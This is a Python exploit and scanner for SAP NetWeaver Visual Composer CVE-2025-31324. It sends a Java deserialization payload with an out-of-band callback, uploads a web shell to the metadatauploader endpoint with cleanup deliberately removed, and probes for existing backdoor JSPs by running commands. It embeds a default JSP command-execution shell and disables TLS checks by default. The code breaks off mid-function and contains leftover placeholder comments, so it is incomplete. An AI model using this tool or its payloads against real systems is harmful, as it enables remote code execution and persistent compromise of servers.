#!/usr/bin/env python3

import argparse
import csv
import json
import logging
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import List, Optional, Tuple, Dict, Any
from concurrent.futures import Future
from urllib.parse import urlparse, urlunparse
import base64
import io
import zipfile

import requests
import urllib3
import ssl # For legacy SSL context
from requests.adapters import HTTPAdapter # For mounting custom SSL context

# Disable insecure request warnings if verify=False is used
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Constants ---
DEFAULT_PATH = "/developmentserver/metadatauploader"
DEFAULT_THREADS = 20
DEFAULT_TIMEOUT = 10 # seconds
LOG_FORMAT = '%(asctime)s - %(levelname)s - %(threadName)s - %(message)s'
LOG_FILE = 'sap_vc_poc.log'

# Default JSP shell payload (from PRD)
DEFAULT_JSP_PAYLOAD = """
<%@ page import="java.io.*"%>
<%
if(request.getParameter("cmd")!=null){
  Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
  BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l; while((l=r.readLine())!=null){out.println(l);} }
%>
"""

# Determined upload path based on common observations/other PoCs for similar vulns
UPLOAD_BASE_DIR = "/sap/public/bc/webdynpro/sap/public/bc/zmetadata_upload"

# Payload template originally sourced from the public CVE-2025-31324 YAML (renamed for PAYLOAD branding)
# base64_decode('rO0ABXNy...')
PAYLOAD_TEMPLATE_B64 = "rO0ABXNyABRqYXZhLnV0aWwuUHJvcGVydGllczkS0HpwNj6YAgABTAAIZGVmYXVsdHN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHIAE2phdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADdwgAAAAFAAAAAnQADnByb2plY3QtbmF0dXJlc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAFzcgAMamF2YS5uZXQuVVJMliU3Nhr85HIDAAdJAAhoYXNoQ29kZUkABHBvcnRMAAlhdXRob3JpdHl0ABJMamF2YS5sYW5nL1N0cmluZztMAARmaWxlcQB+AAhMAARob3N0cQB+AAhMAAhwcm90b2NvbHEAfgAITAADcmVmcQB+AAh4cP//////////dAA2YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhdAAAcQB+AAp0AARodHRwcHh0AD1odHRwOi8vYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheHQAC0VYUE9SVC1OQU1FdAATc29tZV9wcm9qZWN0X25hbWV4eHg="
# Placeholder string within the decoded payload (54 'a's)
PAYLOAD_PLACEHOLDER = b'a' * 54

# --- ANSI Color Codes ---
C_RST = "\033[0m"    # Reset
C_RED = "\033[91m"   # Red
C_GREEN = "\033[92m" # Green
C_YELLOW = "\033[93m"# Yellow
C_BLUE = "\033[94m"  # Blue
C_MAGENTA = "\033[95m"# Magenta
C_CYAN = "\033[96m"  # Cyan
C_BOLD = "\033[1m"

# --- Enums and Data Classes ---
class Status(Enum):
    VULNERABLE = "VULNERABLE"
    SAFE = "SAFE"
    PATCHED_OR_WAF = "PATCHED_OR_WAF"
    UNREACHABLE = "UNREACHABLE"
    ERROR = "ERROR"

@dataclass
class Target:
    host: str
    port: int
    use_https: bool
    base_url: str = field(init=False)
    path_from_url: Optional[str] = None # New field to store path from input URL

    def __post_init__(self):
        scheme = "https" if self.use_https else "http"
        netloc = f"{self.host}:{self.port}"
        self.base_url = urlunparse((scheme, netloc, '', '', '', '')) # Construct base URL properly


@dataclass
class ScanResult:
    target: Target
    status: Status # Status related to the CVE check/exploit
    message: str = ""
    exploit_url: Optional[str] = None
    error_details: Optional[str] = None
    backdoor_found: bool = False # New field for backdoor status
    backdoor_url: Optional[str] = None # New field for backdoor URL

    def as_dict(self) -> dict:
        """Return a dictionary representation suitable for JSON/CSV."""
        return {
            "target": self.target.base_url,
            "status": self.status.value,
            "vulnerable": self.status == Status.VULNERABLE,
            "exploit_url": self.exploit_url if self.exploit_url else "",
            "message": self.message,
            "error_details": self.error_details if self.error_details else "",
            "backdoor_found": self.backdoor_found, # Add to dict
            "backdoor_url": self.backdoor_url if self.backdoor_url else "" # Add to dict
        }

# --- Helper Function and Adapter for Legacy SSL --- 
def create_legacy_ssl_context() -> ssl.SSLContext:
    """Creates an SSL context allowing older TLS versions and potentially weaker ciphers."""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.minimum_version = ssl.TLSVersion.TLSv1
    # Also disable hostname checking when using legacy context, as verify_mode=CERT_NONE requires it
    context.check_hostname = False
    # Set verify_mode directly? Or rely on session.verify=False setting it? Let's try both ways.
    # context.verify_mode = ssl.CERT_NONE # If setting this, session.verify must match?
    try:
        context.set_ciphers('DEFAULT:@SECLEVEL=1')
    except ssl.SSLError:
        logging.warning("Could not set SECLEVEL=1 cipher string, falling back to DEFAULT")
        context.set_ciphers('DEFAULT')
    return context

class LegacySSLAdapter(HTTPAdapter):
    """An HTTPAdapter that initializes its PoolManager with a legacy SSL context."""
    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        try:
            logging.debug("Initializing PoolManager with legacy SSL context.")
            context = create_legacy_ssl_context()
            # Add the context to the pool_kwargs passed to PoolManager
            pool_kwargs['ssl_context'] = context
            self.poolmanager = urllib3.PoolManager(
                num_pools=connections,
                maxsize=maxsize,
                block=block,
                **pool_kwargs
            )
            logging.debug("Legacy PoolManager initialized.")
        except Exception as e:
            logging.error(f"Failed to initialize PoolManager with legacy context: {e}. Falling back to default.", exc_info=True)
            # Fallback to default initialization if custom fails
            super().init_poolmanager(connections, maxsize, block=block, **pool_kwargs)

def create_session(args: argparse.Namespace) -> requests.Session:
    """Creates a requests session, potentially configured for legacy SSL."""
    session = requests.Session()
    session.verify = not args.insecure
    session.headers.update({'User-Agent': f'SAP-VC-POC-CVE-2025-31324/1.0'})

    if args.legacy_ssl:
        logging.warning("Using legacy SSL settings (--legacy-ssl). This reduces security!")
        try:
            # Mount the custom adapter
            legacy_adapter = LegacySSLAdapter()
            session.mount('https://', legacy_adapter)
            logging.debug("Mounted LegacySSLAdapter for https://")
        except Exception as e:
            logging.error(f"Failed to create or mount LegacySSLAdapter: {e}. Proceeding with default SSL settings.", exc_info=True)

    return session

# --- Core Logic ---
def parse_cli() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="SAP NetWeaver Visual Composer CVE-2025-31324 PoC (OAST Check & Exploit Tool)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Disclaimer: Use responsibly and only on authorized systems.

Default action is to check for vulnerability using OAST callback to oast.online.
Exploitation is a separate action triggered by --exploit-file.

Example Usage:
  Check a target using OAST:
    python sap_vc_poc.py -t https://sap.example.com:50001

  Check targets from a file, save results:
    python sap_vc_poc.py -l hosts.txt -o results.csv

  Attempt exploit by uploading a specific JSP shell:
    python sap_vc_poc.py -t sap.example.com:50000 --exploit-file shell.jsp

  Check with legacy SSL and higher timeout:
    python sap_vc_poc.py -t https://10.1.1.5 --legacy-ssl --timeout 20
"""
    )

    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("-t", "--target", help="Single target (host[:port] or full URL)")
    target_group.add_argument("-l", "--list", type=Path, help="File containing targets, one per line")

    parser.add_argument("-p", "--path", default=DEFAULT_PATH,
                        help=f"Target relative path (default: {DEFAULT_PATH}). Used only if the target specified does not include a path.")

    # TLS / SSL behaviour – defaults are now *insecure* to maximise compatibility with old NetWeaver stacks.
    # Users can opt-out with the negative forms.
    parser.add_argument(
        "--insecure",
        action="store_true",
        default=True,
        help="Skip TLS certificate verification (default: ON). Use --secure to enforce verification."
    )
    parser.add_argument(
        "--secure",
        action="store_false",
        dest="insecure",
        help="Enable TLS certificate verification (opt-out of default insecure mode)."
    )

    parser.add_argument(
        "--legacy-ssl",
        action="store_true",
        default=True,
        help="Allow older/insecure TLS protocols (default: ON). Use --no-legacy-ssl to enforce modern TLS only."
    )
    parser.add_argument(
        "--no-legacy-ssl",
        action="store_false",
        dest="legacy_ssl",
        help="Disable legacy TLS support; only modern protocols will be attempted."
    )

    # --- Action Flags --- 
    parser.add_argument("--exploit-file", type=Path, help="Perform exploit: Upload specified file instead of OAST check.")
    
    # --- Output & Tuning --- 
    parser.add_argument("-o", "--outfile", type=Path, help="Write results to a CSV or JSON file (detected by extension)")
    parser.add_argument("-T", "--threads", type=int, default=DEFAULT_THREADS, help=f"Number of concurrent threads (default: {DEFAULT_THREADS})")
    parser.add_argument("-v", "--verbose", action="count", default=0, help="Increase verbosity level (-v INFO, -vv DEBUG)")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help=f"HTTP request timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("--leave-artifacts", action="store_true", help="Do not attempt to delete uploaded files (only relevant when using --exploit-file)")

    args = parser.parse_args()

    # Validation: Check exploit file exists if specified
    if args.exploit_file and not args.exploit_file.is_file():
         parser.error(f"Exploit file not found: {args.exploit_file}")

    # Log the effective TLS settings for transparency
    logging.debug(
        "Effective TLS settings – insecure=%s, legacy_ssl=%s", args.insecure, args.legacy_ssl
    )

    return args

def setup_logging(verbosity: int):
    log_level = logging.WARNING
    if verbosity == 1:
        log_level = logging.INFO
    elif verbosity >= 2:
        log_level = logging.DEBUG

    # Console handler
    console_handler = logging.StreamHandler(sys.stderr)
    console_handler.setFormatter(logging.Formatter('%(levelname)s: %(message)s')) # Simple format for console
    console_handler.setLevel(log_level) # <-- Set level directly on console handler

    # File handler (always DEBUG)
    try:
        file_handler = logging.FileHandler(LOG_FILE, mode='a', encoding='utf-8') # Append mode
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(logging.Formatter(LOG_FORMAT))
        root_level = logging.DEBUG # Root needs to be at least DEBUG if file handler is active
    except Exception as e:
        print(f"Error setting up file logging to {LOG_FILE}: {e}", file=sys.stderr)
        file_handler = None # Disable file logging if setup fails
        root_level = log_level # Root level is just the console level if no file handler

    # Configure root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(root_level) # Set root logger level
    # Clear existing handlers (important in interactive environments)
    for handler in root_logger.handlers[:]:
        root_logger.removeHandler(handler)

    # Add handlers
    root_logger.addHandler(console_handler)
    if file_handler:
        root_logger.addHandler(file_handler)
    # REMOVED: Don't need to adjust root logger level again here
    # # Also set file handler level directly for the root logger if console is WARNING
    # if log_level == logging.WARNING:
    #      root_logger.setLevel(logging.DEBUG) # Ensure DEBUG messages go to file even if console is quiet

    # Quieten requests/urllib3 unless verbosity is high (DEBUG)
    if verbosity < 2:
        logging.getLogger("requests").setLevel(logging.WARNING)
        logging.getLogger("urllib3").setLevel(logging.WARNING)

    # Use the console handler's level for the initial debug message
    logging.debug("Logging initialized. Console Level: %s, File Level: %s", 
                  logging.getLevelName(console_handler.level), 
                  logging.getLevelName(file_handler.level) if file_handler else 'N/A')


def load_targets(args: argparse.Namespace) -> List[Target]:
    targets_raw = []
    if args.target:
        targets_raw.append(args.target.strip())
    elif args.list:
        if not args.list.is_file():
            logging.error(f"Target list file not found: {args.list}")
            sys.exit(1)
        try:
            with args.list.open('r', encoding='utf-8') as f:
                targets_raw = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except IOError as e:
            logging.error(f"Error reading target list {args.list}: {e}")
            sys.exit(1)
        except Exception as e:
            logging.error(f"Unexpected error processing target list {args.list}: {e}")
            sys.exit(1)

    targets: List[Target] = []
    default_port_http = 50000 # Default SAP HTTP port if none specified
    default_port_https = 443 # Default HTTPS port

    for raw in targets_raw:
        host: Optional[str] = None
        port: Optional[int] = None
        use_https: bool = False
        path_from_url: Optional[str] = None

        # Try parsing as full URL first
        if "://" in raw:
            try:
                parsed_url = urlparse(raw)
                scheme_in = parsed_url.scheme.lower()
                if scheme_in not in ['http', 'https'] or not parsed_url.hostname:
                    logging.warning(f"Skipping invalid target URL format: {raw}")
                    continue
                host = parsed_url.hostname
                port = parsed_url.port
                use_https = (scheme_in == 'https')
                path_from_url = parsed_url.path if parsed_url.path and parsed_url.path != '/' else None
                if port is None:
                    port = default_port_https if use_https else default_port_http
            except ValueError as e:
                 logging.warning(f"Could not parse URL '{raw}': {e}. Skipping.")
                 continue
        else:
            # Handle host[:port] format - Default to HTTP
            parts = raw.split(':')
            host = parts[0]
            port_in = None
            if len(parts) > 1:
                try:
                    port_in = int(parts[1])
                except ValueError:
                    logging.warning(f"Skipping invalid target format (bad port): {raw}")
                    continue
            if not host:
                 logging.warning(f"Skipping invalid target format (no host): {raw}")
                 continue
            # --- Scheme defaults to HTTP for host:port format --- 
            use_https = False # Default
            port = port_in if port_in is not None else default_port_http
            logging.debug(f"Defaulting to HTTP for {host} (no scheme specified).")

        # Ensure we have valid host and port
        if not host or port is None:
            logging.warning(f"Could not determine host or port for target: {raw}. Skipping.")
            continue

        try:
            target_obj = Target(host=host, port=port, use_https=use_https, path_from_url=path_from_url)
            targets.append(target_obj)
            logging.debug(f"Parsed target: host={target_obj.host}, port={target_obj.port}, https={target_obj.use_https}, path={target_obj.path_from_url or '(default)'}")
        except Exception as e:
             logging.warning(f"Skipping target {raw} due to error creating Target object: {e}")

    if not targets and (args.target or args.list):
         logging.error("No valid targets could be parsed.")
         sys.exit(1)

    logging.info(f"Loaded {len(targets)} targets to scan.")
    return targets

def get_target_url(target: Target, args: argparse.Namespace) -> str:
    """Constructs the full URL for a given target, prioritizing path from URL if available."""
    # Use path from the target URL if it was provided, otherwise use args.path
    path = target.path_from_url if target.path_from_url is not None else args.path

    # Ensure path starts with / but avoid // if path is already /
    if not path:
        path = '/' # Default to root if path ends up empty
    elif not path.startswith('/'):
        path = '/' + path

    return f"{target.base_url}{path}"

def check_target(target: Target, args: argparse.Namespace) -> Tuple[Status, Optional[str], Optional[str]]:
    """Checks a single target using OAST and Java Deserialization payload."""
    
    # 1. Prepare Payload and OAST URL
    unique_id = uuid.uuid4().hex[:12] # Shorter unique ID for subdomain
    oast_host_hardcoded = "oast.online" # Hardcoded OAST host
    oast_callback_subdomain = f"sap-cve-2025-31324-{unique_id}.{oast_host_hardcoded}"
    # The payload expects a URL format, even though only the host part is used for DNS lookup
    oast_url_for_payload = f"http://{oast_callback_subdomain}" 
    
    logging.debug(f"[{target.host}:{target.port}] Generated OAST callback subdomain: {oast_callback_subdomain}")

    try:
        # Decode the template
        decoded_template = base64.b64decode(PAYLOAD_TEMPLATE_B64)
        # Replace placeholder
        modified_payload_bytes = decoded_template.replace(PAYLOAD_PLACEHOLDER, oast_url_for_payload.encode('utf-8'), 1)
    except Exception as e:
        logging.error(f"[{target.host}:{target.port}] Failed to decode or modify payload template: {e}", exc_info=True)
        return Status.ERROR, "Payload generation failed", str(e)

    # 2. Create ZIP Archive in Memory
    zip_buffer = io.BytesIO()
    try:
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Add the serialized object as content of a file named '.properties'
            zip_file.writestr('.properties', modified_payload_bytes)
        zip_content = zip_buffer.getvalue()
    except Exception as e:
        logging.error(f"[{target.host}:{target.port}] Failed to create ZIP archive: {e}", exc_info=True)
        return Status.ERROR, "ZIP creation failed", str(e)
    finally:
        zip_buffer.close()
        
    # 3. Prepare POST Request
    target_vuln_url = get_target_url(target, args)
    upload_url = f"{target_vuln_url}?CONTENTTYPE=MODEL&CLIENT=1"
    zip_filename = f"check_{unique_id}.zip" # Unique filename for the upload
    files = {
        'file': (zip_filename, zip_content, 'application/zip') # Upload the ZIP content
    }

    session = create_session(args)
    # Note: The auto-retry for CERTIFICATE_VERIFY_FAILED is less critical here, 
    # as we primarily care about the POST succeeding enough to trigger deserialization, 
    # and the OAST callback confirms success. But we keep it for broader compatibility.
    retry_count = 1 
    ssl_verify_failed_retry = False
    
    # 4. Send POST Request
    for attempt in range(retry_count + 1):
        current_verify_setting = session.verify
        try:
            logging.debug(f"[{target.host}:{target.port}] Attempt {attempt+1}: Sending OAST payload POST to {upload_url} (verify={current_verify_setting})")
            response = session.post(upload_url, files=files, timeout=args.timeout, allow_redirects=False)
            logging.debug(f"[{target.host}:{target.port}] OAST POST status: {response.status_code}, Content-Length: {response.headers.get('Content-Length')}, Body Snippet: {response.text[:200].strip()}...")

            # 5. Verification Logic (OAST Based - Check OAST server for interaction)
            # If the request completes without immediate error/rejection, assume payload was processed.
            # Confirmation requires checking the OAST host.
            if response.status_code < 400 or response.status_code >= 500: # Treat 2xx, 3xx(unlikely here), 5xx as potentially successful triggers
                vulnerable_message = f"Payload sent (HTTP {response.status_code}). Check OAST host '{oast_host_hardcoded}' for DNS/HTTP interaction involving subdomain '{oast_callback_subdomain}' to confirm vulnerability."
                logging.info(f"[{target.host}:{target.port}] {vulnerable_message}")
                # Report as VULNERABLE, but qualification is in the message.
                return Status.VULNERABLE, vulnerable_message, None 
            elif response.status_code in [301, 302, 307, 308]: # Explicit redirects
                redir_loc = response.headers.get('Location', 'N/A')
                logging.info(f"[{target.host}:{target.port}] SAFE: OAST POST resulted in redirect ({response.status_code} to {redir_loc}).")
                return Status.PATCHED_OR_WAF, f"Redirect ({response.status_code})", None
            elif response.status_code == 403:
                 logging.info(f"[{target.host}:{target.port}] SAFE: OAST POST resulted in 403 Forbidden.")
                 return Status.PATCHED_OR_WAF, "403 Forbidden", None
            elif response.status_code == 404:
                logging.info(f"[{target.host}:{target.port}] SAFE: Target path ({target_vuln_url}) not found (404).")
                return Status.SAFE, f"Path used not found (404)", None
            elif response.status_code == 401:
                 logging.info(f"[{target.host}:{target.port}] SAFE: Received 401 Unauthorized.")
                 return Status.SAFE, "401 Unauthorized", None
            else: # Other 4xx errors
                logging.warning(f"[{target.host}:{target.port}] OAST POST failed with client error status: {response.status_code}")
                return Status.ERROR, f"Unexpected client error status {response.status_code} on POST", response.text[:200]

        except requests.exceptions.Timeout:
            logging.warning(f"[{target.host}:{target.port}] Timeout during OAST check (Attempt {attempt+1}/{retry_count+1})")
            if attempt == retry_count: return Status.UNREACHABLE, "Request timed out", None
            time.sleep(1)
        except requests.exceptions.SSLError as e:
            if "CERTIFICATE_VERIFY_FAILED" in str(e) and not ssl_verify_failed_retry and session.verify:
                logging.warning(f"[{target.host}:{target.port}] SSL certificate verification failed: {e}. Retrying with verification disabled.")
                session.verify = False
                ssl_verify_failed_retry = True
            else:
                logging.warning(f"[{target.host}:{target.port}] SSL error during OAST POST: {e}")
                return Status.UNREACHABLE, f"SSL error during OAST POST: {e}", None
        except requests.exceptions.ConnectionError as e:
            logging.warning(f"[{target.host}:{target.port}] Connection error: {e} (Attempt {attempt+1}/{retry_count+1})")
            if attempt == retry_count: return Status.UNREACHABLE, f"Connection error: {e}", None
            time.sleep(1)
        except Exception as e:
            logging.error(f"[{target.host}:{target.port}] Unexpected error during OAST check POST: {e}", exc_info=True)
            return Status.ERROR, f"Unexpected error during OAST POST: {e}", None

    # Fallback if loop finishes unexpectedly
    logging.error(f"[{target.host}:{target.port}] OAST check loop completed without returning a status.")
    return Status.ERROR, "OAST Check inconclusive after POST attempts", None

def check_backdoor(target: Target, args: argparse.Namespace) -> Tuple[bool, Optional[str]]:
    """Attempts to detect well-known NetWeaver backdoor JSPs (`helper.jsp`, `cache.jsp`).

    Detection strategy (more resilient):
      1. Build a unique marker and try to `echo` it — the safest command.
      2. If that does not appear in the response, fall back to `id` (Unix) and `whoami` (generic) and
         look for typical output fragments such as `uid=` or the current user name.
      3. Requests now follow redirects (`allow_redirects=True`) because some portals front-end these
         paths with a 302 before serving the JSP.
    """

    backdoor_paths = ["/irj/helper.jsp", "/irj/cache.jsp"]

    # Random marker avoids false positives when many concurrent scans are running
    marker = f"sapbd_{uuid.uuid4().hex[:8]}"

    # (command, expected marker substrings – empty list means *any* non-empty body is fine)
    tests = [
        (f"echo {marker}", [marker]),
        ("id", ["uid=", "gid="]),
        ("whoami", [])
    ]

    session = create_session(args)

    for path in backdoor_paths:
        for cmd, expected_markers in tests:
            url = f"{target.base_url}{path}?cmd={cmd}"
            logging.debug(f"[{target.host}:{target.port}] Backdoor probe -> {url}")

            try:
                # Follow redirects — many SAP front-ends issue a 302 before hitting the servlet container
                response = session.get(url, timeout=args.timeout, allow_redirects=True)
                status = response.status_code
                logging.debug(
                    f"[{target.host}:{target.port}] Backdoor probe status {status}, len={len(response.content)}"
                )

                if status == 404:
                    # Fast skip: file not present at all
                    break  # Try next path – other tests for same path are pointless

                if status == 200:
                    body = response.text
                    # Decide whether the output proves code execution
                    positive = False
                    if expected_markers:
                        positive = any(m in body for m in expected_markers)
                    else:
                        # Fallback test (whoami) – any non-empty body is considered success
                        positive = bool(body.strip())

                    if positive:
                        backdoor_base_url = f"{target.base_url}{path}"
                        logging.info(
                            f"[{target.host}:{target.port}] {C_RED}{C_BOLD}Backdoor CONFIRMED at {backdoor_base_url}{C_RST} via cmd='{cmd}'"
                        )
                        return True, backdoor_base_url

            except requests.exceptions.Timeout:
                logging.debug(f"[{target.host}:{target.port}] Timeout during backdoor probe for {path} – cmd='{cmd}'")
                # Give the host a second chance with the next command/path
                continue
            except requests.exceptions.RequestException as e:
                logging.debug(f"[{target.host}:{target.port}] Network error during backdoor probe for {path}: {e}")
                continue
            except Exception as e:
                logging.error(f"[{target.host}:{target.port}] Unexpected error during backdoor probe for {path}: {e}", exc_info=True)
                continue

    logging.debug(f"[{target.host}:{target.port}] No backdoor detected on common paths.")
    return False, None

def scan_one(target: Target, args: argparse.Namespace) -> ScanResult:
    """Runs checks (CVE OAST, Backdoor) and optionally exploit against a single target."""
    thread_name = threading.current_thread().name
    logging.debug(f"[{target.host}:{target.port}] Starting scan in {thread_name}")

    # --- Always check for backdoor first --- 
    backdoor_found, backdoor_url = check_backdoor(target, args)

    # --- Determine mode based on args --- 
    is_exploit_mode = args.exploit_file is not None

    # --- Run CVE Check or Exploit --- 
    if not is_exploit_mode:
        # Default: Run the OAST-based CVE check
        status, check_message, check_error_details = check_target(target, args)
        
        # OAST check only reports VULNERABLE based on server response pattern;
        # actual confirmation requires checking the OAST server.
        return ScanResult(
            target=target, 
            status=status, 
            message=check_message, 
            error_details=check_error_details,
            backdoor_found=backdoor_found, # Include backdoor result
            backdoor_url=backdoor_url       # Include backdoor result
        )
    else:
        # Exploit Mode: Skip OAST check, directly attempt exploit file upload
        logging.info(f"[{target.host}:{target.port}] Exploit mode specified. Attempting upload of: {args.exploit_file.name}")
        
        # Perform the exploit upload/trigger
        shell_url, exploit_error = exploit_target(target, args)
        
        # Determine status based on exploit outcome
        if shell_url and not exploit_error:
            status = Status.VULNERABLE # Exploit successful implies CVE vulnerable
            message = "Exploit successful!"
            error_details = None
        elif shell_url and exploit_error:
            status = Status.VULNERABLE # Still vulnerable, but trigger failed
            message = f"Exploit partially successful: {exploit_error}"
            error_details = exploit_error
        else:
            # If exploit fails, report as Error for the CVE status.
            # The overall status might still be interesting if a backdoor was found.
            status = Status.ERROR 
            message = f"Exploit failed: {exploit_error or 'Unknown reason'}"
            error_details = exploit_error or "Unknown reason"
            shell_url = None # Ensure shell_url is None on failure
        
        return ScanResult(
            target=target, 
            status=status, 
            message=message, 
            exploit_url=shell_url, 
            error_details=error_details,
            backdoor_found=backdoor_found, # Include backdoor result
            backdoor_url=backdoor_url       # Include backdoor result
        )


# --- Modify exploit_target to use args.exploit_file ---
# This avoids the awkward mapping in scan_one
def exploit_target(target: Target, args: argparse.Namespace) -> Tuple[Optional[str], Optional[str]]:
    """Uploads and attempts to trigger the file specified by --exploit-file."""

    if not args.exploit_file: # Should not happen if called from scan_one correctly
        return None, "Exploit mode called without --exploit-file argument specified"

    payload_file_path = args.exploit_file
    payload_content: bytes
    payload_filename: str

    try:
        payload_content = payload_file_path.read_bytes()
        payload_filename = payload_file_path.name # Use original filename
        if '.' not in payload_filename: 
             payload_filename += ".jsp"
             logging.debug(f"[{target.host}:{target.port}] Added .jsp extension to exploit file: {payload_filename}")
        elif not payload_filename.lower().endswith(('.jsp', '.jspx')):
             logging.warning(f"[{target.host}:{target.port}] Exploit file '{payload_filename}' does not end with .jsp/.jspx. It might not execute.")
    except IOError as e:
        logging.error(f"[{target.host}:{target.port}] Cannot read exploit file {payload_file_path}: {e}")
        return None, f"Cannot read exploit file: {e}"

    # ... (rest of exploit_target logic remains the same, using payload_content and payload_filename) ...
    # ... (create session, POST request, check response, trigger GET) ...
    # ... (Ensure NO calls to delete_uploaded_file remain) ...

    # ... (Example Snippet of rest of exploit_target (no changes needed here) ...)
    target_vuln_url = get_target_url(target, args)
    upload_url = f"{target_vuln_url}?CONTENTTYPE=MODEL&CLIENT=1"
    files = {
        'file': (payload_filename, payload_content, 'application/octet-stream')
    }
    session = create_session(args)
    shell_url_base = None
    ssl_verify_failed_retry_post = False
    for attempt in range(2):
        current_verify_setting = session.verify
        try:
            logging.debug(f"[{target.host}:{target.port}] Attempt {attempt+1}: Sending exploit payload POST to {upload_url} (verify={current_verify_setting})")
            response = session.post(upload_url, files=files, timeout=args.timeout, allow_redirects=False)
            logging.debug(f"[{target.host}:{target.port}] Exploit POST status: {response.status_code}, Headers: {response.headers}")
            shell_path_relative = None
            location = response.headers.get('Location', '')
            if response.status_code in [200, 201]:
                 # ... (Location header / fallback path logic) ...
                 if payload_filename in location:
                      # ... (parse location)
                      parsed_loc = urlparse(location)
                      if parsed_loc.scheme:
                           shell_url_base = location
                           shell_path_relative = parsed_loc.path
                      else:
                           shell_path_relative = location
                           shell_url_base = urlunparse(urlparse(target.base_url)._replace(path=shell_path_relative))
                      logging.debug(f"[{target.host}:{target.port}] Payload potentially uploaded via Location header: {shell_path_relative}")
                 else:
                      shell_path_relative = f"{UPLOAD_BASE_DIR}/{payload_filename}"
                      shell_url_base = urlunparse(urlparse(target.base_url)._replace(path=shell_path_relative))
                      logging.debug(f"[{target.host}:{target.port}] Payload POST successful ({response.status_code}), assuming standard path: {shell_path_relative}")
                 break
            else:
                 logging.error(f"[{target.host}:{target.port}] Exploit payload upload failed with status: {response.status_code}. Body: {response.text[:200]}")
                 return None, f"Payload upload failed (Status: {response.status_code})"
        except requests.exceptions.SSLError as e:
            # ... (SSL Error handling with retry for CERTIFICATE_VERIFY_FAILED)
            if "CERTIFICATE_VERIFY_FAILED" in str(e) and not ssl_verify_failed_retry_post and session.verify:
                 logging.warning(f"[{target.host}:{target.port}] SSL certificate verification failed on exploit POST: {e}. Retrying with verification disabled.")
                 session.verify = False
                 ssl_verify_failed_retry_post = True
            else:
                 logging.warning(f"[{target.host}:{target.port}] SSL error during exploit POST: {e}")
                 return None, f"SSL error during exploit POST: {e}"
        # ... (Other exception handling: RequestException, etc.)
        except requests.exceptions.RequestException as e:
            logging.warning(f"[{target.host}:{target.port}] Network error during exploit POST: {e} (Attempt {attempt+1})")
            if attempt == 1: return None, f"Network error during exploit POST: {e}"
            time.sleep(1)
        except Exception as e:
            logging.error(f"[{target.host}:{target.port}] Unexpected error during exploit POST: {e}", exc_info=True)
            return None, f"Unexpected error during exploit POST: {e}"

    if not shell_url_base:
        logging.error(f"[{target.host}:{target.port}] Could not determine shell URL after POST.")
        return None, "Could not determine shell URL after POST"

    test_cmd = "cmd.exe /c echo test" if "win" in sys.platform else "echo test"
    shell_trigger_url = f"{shell_url_base}?cmd={test_cmd}"
    ssl_verify_failed_retry_get = False
    for attempt in range(2):
        # ... (GET trigger logic with SSL retry for CERTIFICATE_VERIFY_FAILED)
        current_verify_setting = session.verify
        try:
            logging.debug(f"[{target.host}:{target.port}] Attempt {attempt+1}: Triggering payload at {shell_trigger_url} (verify={current_verify_setting})")
            trigger_response = session.get(shell_trigger_url, timeout=args.timeout, headers=session.headers)
            logging.debug(f"[{target.host}:{target.port}] Trigger response status: {trigger_response.status_code}, Content length: {len(trigger_response.content)}")
            if trigger_response.status_code == 200:
                 content_str = trigger_response.text.strip()
                 if "test" in content_str:
                     logging.info(f"[{target.host}:{target.port}] Exploit successful! Shell confirmed working at: {shell_url_base}")
                     # Ensure delete call is removed
                     return shell_url_base, None
                 else:
                     logging.warning(f"[{target.host}:{target.port}] Payload triggered (200 OK) but test command output ('test') not found. Shell might be usable: {shell_url_base}. Output: '{content_str[:100]}'")
                     # Ensure delete call is removed
                     return shell_url_base, "Shell triggered (200 OK) but test command output not verified."
            else:
                 logging.error(f"[{target.host}:{target.port}] Failed to trigger payload. Status: {trigger_response.status_code}. URL: {shell_trigger_url}")
                 return None, f"Failed to trigger payload (Status: {trigger_response.status_code})"
        except requests.exceptions.SSLError as e:
            # ... (SSL Error handling with retry for CERTIFICATE_VERIFY_FAILED)
            if "CERTIFICATE_VERIFY_FAILED" in str(e) and not ssl_verify_failed_retry_get and session.verify:
                 logging.warning(f"[{target.host}:{target.port}] SSL certificate verification failed on trigger GET: {e}. Retrying with verification disabled.")
                 session.verify = False
                 ssl_verify_failed_retry_get = True
            else:
                 logging.warning(f"[{target.host}:{target.port}] SSL error during trigger GET: {e}")
                 return None, f"SSL error during trigger GET: {e}"
        # ... (Other exception handling: RequestException, etc.)
        except requests.exceptions.RequestException as e:
             logging.warning(f"[{target.host}:{target.port}] Network error during trigger GET: {e} (Attempt {attempt+1})")
             if attempt == 1: return None, f"Network error during trigger GET: {e}"
             time.sleep(1)
        except Exception as e:
             logging.error(f"[{target.host}:{target.port}] Unexpected error during trigger GET: {e}", exc_info=True)
             return None, f"Unexpected error during trigger GET: {e}"

    logging.error(f"[{target.host}:{target.port}] Exploit trigger failed after retries.")
